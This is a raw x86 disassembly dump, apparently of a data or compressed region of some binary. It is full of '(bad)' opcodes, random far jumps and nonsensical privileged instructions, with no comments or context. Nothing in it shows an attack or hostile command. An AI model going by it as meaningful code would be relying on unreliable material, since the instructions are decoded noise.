  420308:	adc    BYTE PTR [esi+ecx*4+0x20],dl
  42030c:	ja     0x420355
  42030e:	xchg   esp,eax
  42030f:	int    0x0
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	outs   dx,DWORD PTR ds:[esi]
  420381:	cmp    BYTE PTR [ebp+0x156e8df],0x0
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	daa    
  42038d:	adc    eax,0x3aa7f62a
  420392:	rcr    BYTE PTR [eax],1
  420394:	cmp    BYTE PTR [edi-0x47e0483c],ch
  42039a:	mov    ebp,0x380aaac
  42039f:	or     DWORD PTR [eax-0x7c],ebx
  4203a2:	stos   DWORD PTR es:[edi],eax
  4203a3:	or     ebp,DWORD PTR [ecx+0x3c435fc1]
  4203a9:	(bad)  
  4203aa:	(bad)  
  4203ab:	inc    edx
  4203ac:	out    dx,al
  4203ad:	retf   0x70ab
  4203b0:	ficom  WORD PTR [esi]
  4203b2:	sbb    ebp,DWORD PTR [esi]
  4203b4:	shl    BYTE PTR [ebp+0x32],cl
  4203b7:	xchg   BYTE PTR [ecx+0x2715165b],bh
  4203bd:	and    esi,DWORD PTR [edi+0x74]
  4203c0:	in     eax,dx
  4203c1:	jbe    0x4203ae
  4203c3:	sub    BYTE PTR [esi-0x6a],ch
  4203c6:	pop    ecx
  4203c7:	or     esp,DWORD PTR [edi-0x5]
  4203ca:	mov    bl,0x4
  4203cc:	mov    BYTE PTR [ebp-0x5dd1f232],dl
  4203d2:	ss adc ebp,edx
  4203d5:	(bad)  
  4203d6:	stos   BYTE PTR es:[edi],al
  4203d7:	outs   dx,BYTE PTR ds:[esi]
  4203d8:	sub    ebx,esi
  4203da:	xor    DWORD PTR [esi],ebx
  4203dc:	ret    0x97db
  4203df:	pop    DWORD PTR [eax+esi*8]
  4203e2:	das    
  4203e3:	or     esi,ebp
  4203e5:	je     0x4203a1
  4203e7:	sub    DWORD PTR [esi+0x19],eax
  4203ea:	mov    bh,0x25
  4203ec:	imul   edx,DWORD PTR [ebp+0x2ee06ac2],0xe35d004
  4203f6:	ja     0x4203d9
  4203f8:	add    BYTE PTR [ecx-0x5f],ah
  4203fb:	or     BYTE PTR [eax-0x79f52f90],0x63
  420402:	jmp    0x88318f40
  420407:	addr16 mov esi,0x37206b38
  42040d:	lahf   
  42040e:	adc    esp,DWORD PTR [ecx+0x24a1a71c]
  420414:	jbe    0x42040f
  420416:	dec    eax
  420417:	loopne 0x4203a9
  420419:	pop    eax
  42041a:	add    al,0x7e
  42041c:	mov    ebx,0xcfcb17a
  420421:	cmc    
  420422:	mov    bl,0x62
  420424:	out    0x4a,eax
  420426:	mov    DWORD PTR [ebp+0x48d9fdfd],esi
  42042c:	push   ebx
  42042d:	mov    esi,0x7716a48f
  420432:	in     eax,0xe
  420434:	imul   esp,DWORD PTR [edi+ebp*4-0x264c583b],0xa05424d4
  42043f:	fs dec ecx
  420441:	fidiv  WORD PTR [edx]
  420443:	je     0x4203f0
  420445:	aas    
  420446:	mov    bl,0xd8
  420448:	xor    ebp,DWORD PTR [ecx+0x10]
  42044b:	xchg   edx,eax
  42044c:	arpl   WORD PTR [edi-0x3e],bx
  42044f:	addr16 push eax
  420451:	das    
  420452:	jle    0x4203f1
  420454:	xchg   BYTE PTR [edx+0x8],bl
  420457:	lock jg 0x420483
  42045a:	mov    ds:0x46dc6dfa,al
  42045f:	outs   dx,BYTE PTR ds:[esi]
  420460:	add    eax,DWORD PTR [edx]
  420462:	retf   0xbeb5
  420465:	sub    eax,esi
  420467:	pusha  
  420468:	pop    es
  420469:	mov    dh,0xac
  42046b:	lahf   
  42046c:	lock out dx,eax
  42046e:	pop    ss
  42046f:	xchg   edi,eax
  420470:	aas    
  420471:	xor    eax,0xc92f79d9
  420476:	ins    DWORD PTR es:[edi],dx
  420477:	mov    ah,0x86
  420479:	(bad)  
  42047a:	idiv   DWORD PTR [esi-0x7ecfe3de]
  420480:	mov    BYTE PTR [ecx],al
  420482:	inc    esi
  420483:	pop    ebx
  420484:	popf   
  420485:	jo     0x420463
  420487:	sub    bh,BYTE PTR gs:[ebx+0x2be256bb]
  42048e:	push   0xffffff99
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	sbb    bh,cl
  420502:	push   ebp
  420503:	push   ebx
  420504:	in     al,dx
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	mov    ch,0x67
  42050e:	adc    bl,BYTE PTR [ebp+ebp*2+0x14799581]
  420515:	inc    eax
  420516:	sub    DWORD PTR [ecx],esi
  420518:	pusha  
  420519:	jo     0x4204a8
  42051b:	hlt    
  42051c:	jno    0x4204a8
  42051e:	cli    
  42051f:	add    al,0xdf
  420521:	or     dh,BYTE PTR [edx+0x44]
  420524:	cmc    
  420525:	add    ch,BYTE PTR [esi+0x56b763c2]
  42052b:	in     eax,dx
  42052c:	fdiv   QWORD PTR [edx-0x73]
  42052f:	push   0x4ef0c586
  420534:	fstp   DWORD PTR [esi-0x362ca18]
  42053a:	fwait
  42053b:	and    eax,0x2f7c24dc
  420540:	and    BYTE PTR [edx-0x5c8aab0c],ch
  420546:	push   eax
  420547:	dec    edi
  420548:	aaa    
  420549:	std    
  42054a:	adc    ebx,DWORD PTR [eax-0x60]
  42054d:	pop    edx
  42054e:	jne    0x4204f9
  420550:	add    bh,cl
  420552:	mov    edi,0x4c5cdec6
  420557:	pop    ds
  420558:	test   BYTE PTR [ebp+esi*1-0x18d333ac],al
  42055f:	lahf   
  420560:	je     0x42053b
  420562:	pusha  
  420563:	jno    0x420502
  420565:	adc    eax,0x444743e9
  42056a:	shr    DWORD PTR [ecx+0x18],0x23
  42056e:	(bad)  
  42056f:	mov    WORD PTR [ecx],fs
  420571:	mul    DWORD PTR [esi-0x64]
  420574:	pop    esp
  420575:	jo     0x420540
  420577:	add    DWORD PTR [edx-0x4b],eax
  42057a:	pop    edx
  42057b:	and    eax,DWORD PTR [ebp-0x430cb57f]
  420581:	hlt    
  420582:	stc    
  420583:	and    esi,DWORD PTR [edx-0x3d0519f2]
  420589:	pop    ss
  42058a:	fcmovnu st,st(4)
  42058c:	add    eax,DWORD PTR [ebx-0x4f]
  42058f:	cli    
  420590:	cdq    
  420591:	loope  0x4205b6
  420593:	pop    ds
  420594:	aad    0xb9
  420596:	in     eax,dx
  420597:	clc    
  420598:	fdivrp st(6),st
  42059a:	mov    ds:0x18c2102d,eax
  42059f:	push   cs
  4205a0:	sahf   
  4205a1:	cmp    eax,0x61659bd1
  4205a6:	cmp    DWORD PTR [eax],0xf6ccd359
  4205ac:	outs   dx,DWORD PTR ds:[esi]
  4205ad:	ja     0x420534
  4205af:	push   0x51
  4205b1:	outs   dx,BYTE PTR ds:[esi]
  4205b2:	sub    DWORD PTR [edi+edi*2],esp
  4205b5:	mov    ch,al
  4205b7:	cli    
  4205b8:	addr16 mov eax,0x33bdff53
  4205be:	in     al,0xb7
  4205c0:	outs   dx,BYTE PTR ds:[esi]
  4205c1:	pop    edx
  4205c2:	jns    0x420640
  4205c4:	pop    esp
  4205c5:	mov    bl,0xd4
  4205c7:	inc    edi
  4205c8:	shr    eax,0xd7
  4205cb:	in     eax,dx
  4205cc:	xchg   DWORD PTR [ebx-0x3f],edi
  4205cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205d0:	pop    ebp
  4205d1:	inc    ecx
  4205d2:	mov    ecx,0xf53390
  4205d7:	push   eax
  4205d8:	scas   al,BYTE PTR es:[edi]
  4205d9:	mov    eax,0x5b1517ab
  4205de:	push   ebp
  4205df:	push   esi
  4205e0:	cdq    
  4205e1:	xchg   DWORD PTR [ecx],ebx
  4205e3:	jmp    0x7e63:0xcae90e02
  4205ea:	leave  
  4205eb:	and    ah,BYTE PTR [eax+0x31e20a6]
  4205f1:	jmp    ebx
  4205f3:	daa    
  4205f4:	das    
  4205f5:	jne    0x420595
  4205f7:	or     bh,ch
  4205f9:	(bad)  
  4205fa:	shl    BYTE PTR [ebp+0x71957f89],0xa1
  420601:	call   0x3a14:0x72bd1a98
  420608:	and    BYTE PTR [eax-0x7d],dl
  42060b:	add    DWORD PTR [edx+0xd743d],esi
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	in     eax,dx
  420681:	dec    edi
  420682:	(bad)  
  420683:	(bad)  
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	clc    
  42068d:	xor    al,0xc3
  42068f:	dec    esi
  420690:	mov    edx,0xce376930
  420695:	xchg   ebp,eax
  420696:	xlat   BYTE PTR ds:[ebx]
  420697:	xor    eax,0x43ed723a
  42069c:	inc    esp
  42069d:	adc    ebx,DWORD PTR [ecx-0x4c501d3b]
  4206a3:	pop    esi
  4206a4:	and    al,0x6
  4206a6:	xchg   DWORD PTR gs:[eax],ecx
  4206a9:	adc    eax,0xad3a9a95
  4206ae:	cdq    
  4206af:	mov    edi,0x89751d55
  4206b4:	ror    BYTE PTR [eax-0x5e8a2807],1
  4206ba:	jmp    0x1ac10cab
  4206bf:	in     eax,dx
  4206c0:	popf   
  4206c1:	stc    
  4206c2:	test   al,0x18
  4206c4:	pop    ebp
  4206c5:	cmc    
  4206c6:	mov    ecx,0x9edb21d7
  4206cb:	fadd   st,st(2)
  4206cd:	repnz mov esp,DWORD PTR [ebx-0x14618079]
  4206d4:	add    al,0xfd
  4206d6:	fmul   DWORD PTR ds:[eax]
  4206d9:	xchg   edx,eax
  4206da:	cld    
  4206db:	ins    DWORD PTR es:[edi],dx
  4206dc:	pop    edx
  4206dd:	retf   
  4206de:	sti    
  4206df:	jmp    0xbb1a:0x52d6f3ba
  4206e6:	pusha  
  4206e7:	aam    0x6c
  4206e9:	add    al,0x5e
  4206eb:	jle    0x420755
  4206ed:	push   edx
  4206ee:	sub    dl,BYTE PTR [esp+ebx*4-0x526d98db]
  4206f5:	dec    BYTE PTR [ecx+0x7a70e7c4]
  4206fb:	mov    ch,0x9e
  4206fd:	shl    dh,0xca
  420700:	push   esp
  420701:	cdq    
  420702:	and    ch,ch
  420704:	mov    dl,0x9
  420706:	pop    edx
  420707:	imul   ebx,DWORD PTR [edi-0x2545fcc3],0xfa861952
  420711:	repnz in eax,dx
  420713:	cmc    
  420714:	int    0x32
  420716:	adc    esi,DWORD PTR [esi-0x12]
  420719:	cmp    DWORD PTR fs:[edi],ecx
  42071c:	cmp    al,0x5
  42071e:	xor    esi,DWORD PTR [edx]
  420720:	test   eax,0x905ee1ca
  420725:	jge    0x4206e3
  420727:	lods   al,BYTE PTR ds:[esi]
  420728:	test   DWORD PTR [ebx-0x6c],ebp
  42072b:	fist   DWORD PTR [ebx]
  42072d:	jne    0x420706
  42072f:	fbld   TBYTE PTR [edi+0x6a]
  420732:	adc    esi,DWORD PTR [edi]
  420734:	mov    ecx,0xefd60b9
  420739:	push   cs
  42073a:	inc    edi
  42073b:	jmp    0x4206cf
  42073d:	mov    esp,0x48d8bcb2
  420742:	xlat   BYTE PTR ds:[ebx]
  420743:	pop    ds
  420744:	pop    esp
  420745:	jnp    0x42076f
  420747:	inc    edi
  420748:	sub    bh,BYTE PTR ds:0x69779554
  42074e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074f:	lds    edi,FWORD PTR [ebx+0x0]
  420752:	cdq    
  420753:	jns    0x420703
  420755:	aas    
  420756:	xlat   BYTE PTR ds:[ebx]
  420757:	retf   
  420758:	in     eax,0x33
  42075a:	dec    esi
  42075b:	xchg   ecx,eax
  42075c:	xchg   ecx,eax
  42075d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42075e:	je     0x420797
  420760:	mov    ds:0x27eacadc,al
  420765:	push   ebp
  420766:	mov    ds:0x632a0dea,al
  42076b:	xchg   edi,eax
  42076c:	in     al,0x49
  42076e:	subps  xmm4,XMMWORD PTR [ecx+edx*1-0x53e3c41d]
  420776:	test   eax,0x69c093b4
  42077b:	aad    0xbf
  42077d:	or     bl,BYTE PTR [eax]
  42077f:	push   0x57
  420781:	mov    dl,0xb8
  420783:	ins    BYTE PTR es:[edi],dx
  420784:	sub    eax,0x4a16062f
  420789:	mov    ecx,0x7b2a3aae
  42078e:	stos   DWORD PTR es:[edi],eax
  42078f:	pop    DWORD PTR [eax]
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	test   DWORD PTR [ebx+0x7b],0x159f45d
  420807:	add    BYTE PTR [ecx+eax*1],al
  42080a:	add    BYTE PTR [eax],al
  42080c:	sbb    al,0xca
  42080f:	xchg   ebx,eax
  420810:	or     BYTE PTR [ebx],ch
  420812:	ja     0x420834
  420814:	dec    ecx
  420815:	dec    ebx
  420816:	adc    edi,DWORD PTR [eax]
  420818:	cdq    
  420819:	mov    dh,0x54
  42081b:	cmp    DWORD PTR [edi],esp
  42081d:	xchg   ebx,eax
  42081e:	ror    BYTE PTR [ebx+0x5a],1
  420821:	rol    BYTE PTR [ecx-0x44],0xb2
  420825:	sbb    al,0x23
  420827:	jecxz  0x42084c
  420829:	imul   ebx,DWORD PTR [edi+0x4b],0x3320dae9
  420830:	popa   
  420831:	hlt    
  420832:	pop    edi
  420833:	les    esp,FWORD PTR ds:0xcd72618b
  420839:	lods   eax,DWORD PTR ds:[esi]
  42083a:	scas   eax,DWORD PTR es:[edi]
  42083b:	repnz aas 
  42083d:	jle    0x42080e
  42083f:	in     al,dx
  420840:	and    BYTE PTR fs:[ecx],cl
  420843:	lods   eax,DWORD PTR ds:[esi]
  420844:	dec    eax
  420845:	push   esi
  420846:	sbb    eax,0x74e94ff2
  42084b:	and    ebp,edx
  42084d:	inc    eax
  42084e:	dec    edi
  42084f:	sbb    ecx,ebx
  420851:	retf   0xe8fa
  420854:	mov    bh,0x72
  420856:	call   0xc42b:0x6033e6a1
  42085d:	ins    BYTE PTR es:[edi],dx
  42085e:	mov    bl,ch
  420860:	sub    eax,0xe37d91b8
  420865:	out    0xf6,eax
  420867:	hlt    
  420868:	push   edi
  420869:	push   ds
  42086a:	ss test al,0x8
  42086d:	arpl   WORD PTR [edx-0x49],di
  420870:	outs   dx,BYTE PTR ds:[esi]
  420871:	mov    BYTE PTR [edx-0x2c],dl
  420874:	jmp    0x69ce:0x57e14c79
  42087b:	push   ebp
  42087c:	cmp    bh,BYTE PTR [edx+0x27]
  42087f:	(bad)  
  420880:	popa   
  420881:	mov    ds:0xa86eff24,al
  420886:	sar    esi,1
  420888:	ds (bad) 
  42088b:	repnz shr BYTE PTR cs:[edx+0x71],cl
  420890:	cmp    al,0xa1
  420892:	fisttp QWORD PTR [edx+0x5de6a8b1]
  420898:	push   ebx
  420899:	std    
  42089a:	mov    ebp,0xd04a2df2
  42089f:	fild   DWORD PTR [esp+eax*1+0xd642e12]
  4208a6:	inc    ecx
  4208a7:	mov    BYTE PTR [ebx-0x67],0x6b
  4208ab:	lahf   
  4208ac:	cmp    DWORD PTR [esi],0x7eb89910
  4208b2:	jae    0x4208aa
  4208b4:	jecxz  0x42083a
  4208b6:	sub    eax,0x16168d9b
  4208bb:	push   cs
  4208bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208bd:	shr    DWORD PTR [ecx],1
  4208bf:	test   DWORD PTR [edi],edx
  4208c1:	mov    dl,0x37
  4208c3:	xchg   ecx,eax
  4208c4:	icebp  
  4208c5:	sti    
  4208c6:	adc    eax,0xaf16ac23
  4208cb:	mov    BYTE PTR [eax+0x5f92dda0],0x68
  4208d2:	or     edi,edi
  4208d4:	pop    edi
  4208d5:	fwait
  4208d6:	add    DWORD PTR [edx],edi
  4208d8:	xchg   ebx,eax
  4208d9:	mov    esi,?
  4208db:	or     al,0x81
  4208dd:	out    0xff,eax
  4208df:	jl     0x4208e8
  4208e1:	jnp    0x420892
  4208e3:	jg     0x420931
  4208e5:	test   eax,0xa37967ad
  4208ea:	hlt    
  4208eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ec:	push   edi
  4208ed:	adc    BYTE PTR [esi+0x4b875b90],ah
  4208f3:	adc    ebx,DWORD PTR [ebp-0x5e087312]
  4208f9:	out    0xf,eax
  4208fb:	xchg   ebx,eax
  4208fc:	push   edi
  4208fd:	jmp    0x26c5:0xb8d4f1ac
  420904:	xor    eax,0x756b2b8c
  420909:	xchg   edx,eax
  42090a:	pop    es
  42090b:	sub    BYTE PTR [edi-0x40],ch
  42090e:	adc    bh,al
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xc8
  420981:	sbb    DWORD PTR [edi+0x44],eax
  420984:	clc    
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	xchg   esi,eax
  42098d:	add    DWORD PTR [ecx+0x7e],esi
  420990:	jge    0x42099b
  420992:	push   esi
  420993:	push   edx
  420994:	pop    ebp
  420995:	push   edx
  420996:	mov    ebx,DWORD PTR [esi]
  420998:	dec    edx
  420999:	sbb    cl,BYTE PTR [ecx]
  42099b:	hlt    
  42099c:	(bad)  
  42099d:	mov    BYTE PTR [esp+ebx*2],0xbb
  4209a1:	jle    0x4209dc
  4209a3:	and    eax,0x5eb9fe8b
  4209a8:	loop   0x420a0d
  4209aa:	add    DWORD PTR [eax],0x16
  4209ad:	or     DWORD PTR [edx],ebp
  4209af:	xor    BYTE PTR [ebp-0x72],cl
  4209b2:	mov    al,0xbc
  4209b4:	nop
  4209b5:	push   edi
  4209b6:	sahf   
  4209b7:	scas   eax,DWORD PTR es:[edi]
  4209b8:	dec    ebx
  4209b9:	push   ds
  4209ba:	sub    edx,0x3e
  4209bd:	inc    esp
  4209be:	jmp    0x42099e
  4209c0:	retf   0x8207
  4209c3:	lods   al,BYTE PTR ds:[esi]
  4209c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209c5:	stc    
  4209c6:	xor    BYTE PTR [edx-0x387b9a18],al
  4209cc:	push   edx
  4209cd:	test   al,0x49
  4209cf:	aad    0x24
  4209d1:	mov    bl,0x2a
  4209d3:	and    eax,0x9d381dd1
  4209d8:	mov    eax,0xc0c46337
  4209dd:	icebp  
  4209de:	jmp    0x420a1f
  4209e0:	or     eax,0xe27abd4e
  4209e5:	cmp    BYTE PTR [ebp-0x5a],bh
  4209e8:	mov    eax,0x13d1efe7
  4209ed:	enter  0xa43,0xad
  4209f1:	or     BYTE PTR [edx],ah
  4209f3:	(bad)  
  4209f4:	gs jb  0x420a21
  4209f7:	and    eax,0xb5535e53
  4209fc:	dec    edi
  4209fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209fe:	mov    dl,0xbb
  420a00:	ror    bh,cl
  420a02:	adc    eax,0x14c2c517
  420a07:	and    BYTE PTR [ebx+0x51cc51ef],dl
  420a0d:	and    DWORD PTR [ecx+eiz*4-0x41],esi
  420a11:	push   ecx
  420a12:	xlat   BYTE PTR ds:[ebx]
  420a13:	pop    ds
  420a14:	jnp    0x420a41
  420a16:	(bad)  
  420a17:	mov    esp,0x3febc637
  420a1c:	ffreep st(1)
  420a1e:	je     0x4209d1
  420a20:	or     DWORD PTR [eax+0x4],esp
  420a23:	sub    al,0x79
  420a25:	aad    0x4b
  420a27:	pushf  
  420a28:	add    eax,0x418a7a27
  420a2d:	clc    
  420a2e:	shl    BYTE PTR [eax+0x32803897],0x32
  420a35:	ret    0xa4a4
  420a38:	sbb    al,0xb2
  420a3a:	ins    DWORD PTR es:[edi],dx
  420a3b:	cdq    
  420a3c:	add    bl,BYTE PTR ds:0x5a92f0fb
  420a42:	push   ebp
  420a43:	add    al,0xf0
  420a45:	aaa    
  420a46:	push   0xffffff8f
  420a48:	int3   
  420a49:	mov    bl,bl
  420a4b:	lea    ecx,[eax]
  420a4d:	inc    edx
  420a4e:	test   eax,0x51deeac9
  420a53:	add    DWORD PTR [edx],ecx
  420a55:	outs   dx,BYTE PTR ds:[esi]
  420a56:	add    eax,0xffffffe2
  420a59:	dec    esi
  420a5a:	rcl    BYTE PTR [eax+0x78],1
  420a5d:	mov    bl,0xcb
  420a5f:	jl     0x420a15
  420a61:	sbb    al,0x20
  420a63:	xchg   ebp,eax
  420a64:	inc    esp
  420a65:	enter  0xc67e,0x4f
  420a69:	call   DWORD PTR [ebx]
  420a6b:	or     DWORD PTR [esi+0x5e544d9c],ebp
  420a71:	loop   0x420a25
  420a73:	add    BYTE PTR [esi],bl
  420a75:	pushf  
  420a76:	push   cs
  420a77:	mov    ds:0xab03e435,al
  420a7c:	and    al,0x76
  420a7e:	xchg   ebx,eax
  420a7f:	bound  esp,QWORD PTR [edi-0x6a]
  420a82:	cwde   
  420a83:	or     DWORD PTR [eax],edi
  420a85:	int    0x2c
  420a87:	push   cs
  420a88:	inc    edx
  420a89:	icebp  
  420a8a:	xor    eax,0xc7097cd6
  420a8f:	enter  0x0,0x0
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	fist   WORD PTR [ebx+0x5bfc91ca]
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	gs jg  0x420b4c
  420b0f:	mov    bh,0xcc
  420b11:	(bad)  
  420b12:	sbb    eax,0x4cfbe768
  420b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b18:	into   
  420b19:	and    dh,dl
  420b1b:	add    al,0x27
  420b1d:	or     ah,dh
  420b1f:	int3   
  420b20:	mov    ds:0xf49bd083,eax
  420b25:	imul   edx,DWORD PTR [ecx+0x57],0xffffffbe
  420b29:	fs dec edx
  420b2b:	sub    eax,0x4a122971
  420b30:	mov    ch,0xf9
  420b32:	and    BYTE PTR [ebp-0x3],0x6e
  420b36:	jmp    0x5820:0x6600ad6e
  420b3d:	ins    DWORD PTR es:[edi],dx
  420b3e:	imul   edx,DWORD PTR [eax+ebp*1],0x48
  420b42:	retf   0x3cbe
  420b45:	adc    esp,eax
  420b47:	inc    eax
  420b48:	aaa    
  420b49:	daa    
  420b4a:	mov    ecx,0x7d1938ac
  420b4f:	daa    
  420b50:	sbb    eax,0x6e1d2b75
  420b55:	add    al,0x82
  420b57:	ja     0x420b9b
  420b59:	mov    eax,eax
  420b5b:	adc    eax,0xfb244fdb
  420b60:	sub    eax,0xe7054552
  420b65:	imul   ebp,DWORD PTR es:[ecx+0x7],0xf02073ed
  420b6d:	jmp    0x420b22
  420b6f:	loope  0x420b43
  420b71:	in     al,0xf0
  420b73:	fadd   DWORD PTR ds:0x86765102
  420b79:	sbb    eax,0x42f4d8c2
  420b7e:	in     al,0x9c
  420b80:	mov    cl,BYTE PTR [edi+0x79574439]
  420b86:	rcl    al,1
  420b88:	loopne 0x420b13
  420b8a:	ret    
  420b8b:	int3   
  420b8c:	imul   esi,DWORD PTR [esi-0x97d061c],0xe7d72803
  420b96:	fcmovne st,st(3)
  420b98:	into   
  420b99:	adc    BYTE PTR [esi],cl
  420b9b:	sbb    esp,ebx
  420b9d:	or     al,BYTE PTR [ebx+eax*2]
  420ba0:	sbb    ah,dl
  420ba2:	fidivr DWORD PTR [edi+ebp*1+0x6ff12954]
  420ba9:	fwait
  420baa:	mov    edi,0x8a541d4b
  420baf:	lods   eax,DWORD PTR ds:[esi]
  420bb0:	add    al,0xd8
  420bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bb3:	mov    BYTE PTR [edx+esi*1+0x3cb1ef41],0xfb
  420bbb:	int    0x5c
  420bbd:	scas   al,BYTE PTR es:[edi]
  420bbe:	mov    ah,0x7
  420bc0:	dec    ebx
  420bc1:	and    al,BYTE PTR [ecx+0x48]
  420bc4:	inc    edx
  420bc5:	test   BYTE PTR [edi*8+0x2a31a93f],0x43
  420bcd:	ins    BYTE PTR es:[edi],dx
  420bce:	into   
  420bcf:	sahf   
  420bd0:	sahf   
  420bd1:	cli    
  420bd2:	loope  0x420b66
  420bd4:	(bad)  
  420bd5:	inc    edi
  420bd6:	test   BYTE PTR [edx],0x42
  420bd9:	jmp    0x98cc69a9
  420bde:	(bad)  
  420bdf:	lahf   
  420be0:	push   esp
  420be1:	xchg   ebp,eax
  420be2:	or     dl,BYTE PTR [esi+esi*1+0x27]
  420be6:	or     al,0x8b
  420be8:	(bad)  
  420be9:	pusha  
  420bea:	sub    ah,dl
  420bec:	jns    0x420c49
  420bee:	es int3 
  420bf0:	scas   eax,DWORD PTR es:[edi]
  420bf1:	xor    esi,ebp
  420bf3:	(bad)  
  420bf4:	or     BYTE PTR [esi+0x7e8c9465],dh
  420bfa:	dec    ecx
  420bfb:	(bad)
  420bfe:	cld    
  420bff:	pop    ecx
  420c00:	inc    esp
  420c01:	loope  0x420c11
  420c03:	cmp    BYTE PTR [eax-0xb],bl
  420c06:	jge    0x420c5b
  420c08:	sbb    ch,BYTE PTR [eax]
  420c0a:	push   ecx
  420c0b:	mov    WORD PTR [eax+0x836b27],?
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	shl    BYTE PTR [edi+0x5d00482a],1
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	in     eax,0x6c
  420c8e:	(bad)  
  420c90:	mov    esp,0x9a46c21
  420c95:	xchg   esp,eax
  420c96:	aas    
  420c97:	popa   
  420c98:	push   edi
  420c99:	fwait
  420c9a:	out    0xee,eax
  420c9c:	int    0x44
  420c9e:	jmp    0x900a:0xd8fad7cd
  420ca5:	inc    ecx
  420ca6:	jmp    0x420cda
  420ca8:	push   es
  420ca9:	scas   eax,DWORD PTR es:[edi]
  420caa:	adc    eax,0xb700fcce
  420caf:	and    eax,0x45a03088
  420cb4:	loopne 0x420c37
  420cb6:	imul   edi,DWORD PTR ds:0x5a42adf4,0x8
  420cbd:	sub    DWORD PTR [ecx-0x466e5138],esp
  420cc3:	test   DWORD PTR [esi+ecx*8],edx
  420cc6:	shr    BYTE PTR [edx-0x3ca33352],cl
  420ccc:	push   ebx
  420ccd:	mov    esi,0x88af8839
  420cd2:	cmp    eax,0x4707b576
  420cd7:	dec    esi
  420cd8:	pop    ss
  420cd9:	push   0x9b188a0a
  420cde:	xor    BYTE PTR [esi-0x37],al
  420ce1:	mov    ch,0xbd
  420ce3:	int3   
  420ce4:	aas    
  420ce5:	adc    al,0x76
  420ce7:	sbb    edx,DWORD PTR [eax]
  420ce9:	out    dx,al
  420cea:	jecxz  0x420d3c
  420cec:	test   eax,0xa2002a52
  420cf1:	test   eax,0xaedd8490
  420cf6:	(bad)
  420cfa:	push   es
  420cfb:	dec    ecx
  420cfc:	inc    edx
  420cfd:	or     BYTE PTR [ebx],dh
  420cff:	jmp    0x420d50
  420d01:	inc    esi
  420d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d03:	dec    edx
  420d04:	adc    ebx,ebx
  420d06:	ins    DWORD PTR es:[edi],dx
  420d07:	fstp   st(3)
  420d09:	fs jle 0x420c98
  420d0c:	mov    edx,0x20945883
  420d11:	ds (bad) 
  420d13:	loop   0x420cb8
  420d15:	(bad)  
  420d16:	jmp    edi
  420d18:	adc    al,0x6c
  420d1a:	push   edi
  420d1b:	(bad)  
  420d1d:	adc    esi,DWORD PTR [edi]
  420d1f:	ja     0x420cc4
  420d21:	push   ds
  420d22:	(bad)  
  420d23:	inc    ecx
  420d24:	ret    0x8ff
  420d27:	sub    edx,edx
  420d29:	mov    ds:0xec9b5fed,eax
  420d2e:	jno    0x420d1b
  420d30:	xlat   BYTE PTR ds:[ebx]
  420d31:	test   eax,0x17faf21f
  420d36:	mov    esp,0x4ce37cf0
  420d3b:	call   0x2755:0x8f63a3f
  420d42:	cwde   
  420d43:	pop    ebx
  420d44:	adc    BYTE PTR [ecx+0x134106a],cl
  420d4a:	das    
  420d4b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420d4d:	push   es
  420d4e:	jno    0x420d9a
  420d50:	lahf   
  420d51:	test   al,0x2c
  420d53:	std    
  420d54:	js     0x420cdb
  420d56:	adc    edx,DWORD PTR [ebx+0x594ec066]
  420d5c:	adc    eax,0xd62714c9
  420d61:	js     0x420d8c
  420d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d64:	jae    0x420dce
  420d66:	pop    ecx
  420d67:	mov    eax,0xde39fb81
  420d6c:	jge    0x420d2e
  420d6e:	cld    
  420d6f:	nop
  420d70:	retf   0xc33a
  420d73:	mov    ebp,0xd12a5824
  420d78:	dec    edx
  420d79:	pop    ebx
